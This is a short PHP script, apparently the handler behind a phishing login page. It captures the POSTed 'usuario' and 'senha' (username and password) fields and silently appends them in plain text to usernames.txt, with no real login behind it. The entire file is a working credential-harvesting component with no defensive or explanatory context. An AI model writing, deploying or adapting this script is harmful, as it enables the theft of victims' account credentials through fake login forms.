<?php

file_put_contents("usernames.txt", "Username: " . $_POST['usuario'] . " Pass: " . $_POST['senha'] . "\n", FILE_APPEND);
exit();
?>